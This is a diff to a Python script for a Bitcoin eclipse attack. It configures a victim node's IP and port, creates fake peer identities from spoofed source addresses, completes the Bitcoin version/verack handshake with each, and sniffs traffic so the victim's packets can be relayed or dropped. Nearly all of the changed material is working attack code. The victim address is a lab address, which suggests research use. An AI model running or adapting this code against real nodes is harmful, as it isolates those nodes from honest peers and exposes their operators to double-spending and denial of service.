@@ -24,7 +24,7 @@ victim_ip = '10.0.2.4'
 victim_port = 8333
 
 # How many identities should run simultaneously
-num_identities = 8
+num_identities = 1
 
 # Percentage (0 to 1) of packets to drop, else: relayed to victim
 eclipse_packet_drop_rate = 0
@@ -180,6 +180,65 @@ def make_fake_connection(src_ip, dst_ip, verbose=True):
 	except:
 		print('Error: unable to  start thread to sniff interface {interface}')
 
+	make_fake_connection_to_bitcoin(socket, interface, src_ip, attacker_ip, 8333, verbose)
+
+# Creates a fake connection to the victim
+def make_fake_connection_to_bitcoin(socket, interface, src_ip, dst_ip, dst_port, verbose=True):
+	src_port = random.randint(1024, 65535)
+	print(f'Creating Bitcoin identity ({src_ip} : {src_port}) to connect to ({dst_ip} : {dst_port})...')
+
+	if verbose: print('Creating network socket...')
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	
+	if verbose: print(f'Setting socket network interface to "{network_interface}"...')
+	success = s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, str(network_interface + '\0').encode('utf-8'))
+	while success == -1:
+		print(f'Setting socket network interface to "{network_interface}"...')
+		success = s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, str(network_interface + '\0').encode('utf-8'))
+		time.sleep(1)
+		print(network_interface)
+
+	if verbose: print(f'Binding socket to ({src_ip} : {src_port})...')
+	s.bind((src_ip, src_port))
+
+	if verbose: print(f'Connecting ({src_ip} : {src_port}) to ({dst_ip} : {dst_port})...')
+	try:
+		s.connect((dst_ip, dst_port))
+	except:
+		close_connection(s, src_ip, src_port, interface)
+		make_fake_connection(random_ip(), dst_ip, False)
+		return
+
+	# Send version packet
+	version = version_packet(src_ip, dst_ip, src_port, dst_port)
+	s.send(version.to_bytes())
+	# Get verack packet
+	verack = s.recv(1924)
+	# Send verack packet
+	verack = msg_verack(bitcoin_protocolversion)
+	s.send(verack.to_bytes())
+	# Get verack packet
+	verack = s.recv(1024)
+
+	if verbose: print('Connection successful!')
+
+	identity_address.append((src_ip, src_port))
+	identity_socket.append(s)
+
+	# Listen to the connections for future packets
+	if verbose: print('Attaching packet listener to {interface}')
+	try:
+		start_new_thread(sniff, (), {
+			'socket': s,
+			'src_ip': src_ip,
+			'src_port': src_port,
+			'dst_ip': dst_ip,
+			'dst_port': dst_port,
+			'interface': interface
+		})
+	except:
+		print('Error: unable to  start thread to sniff interface {interface}')
+
 def sniff(socket, src_ip, src_port, dst_ip, dst_port, interface):
 	while True:
 		packet = socket.recv(65565)
@@ -216,7 +275,7 @@ def packet_received(msg_raw, socket, from_ip, from_port, to_ip, to_port, interfa
 
 	# Relay Bitcoin packets that aren't from the victim
 	if from_ip == victim_ip:
-		print(f'*** Message received ** addr={from_ip} ** cmd={msg_type}')
+		print(f'*** Message received ** addr={to_ip} ** cmd={msg_type}')
 		try:
 			if msg_type == 'ping':
 				pong = msg_pong(bitcoin_protocolversion)
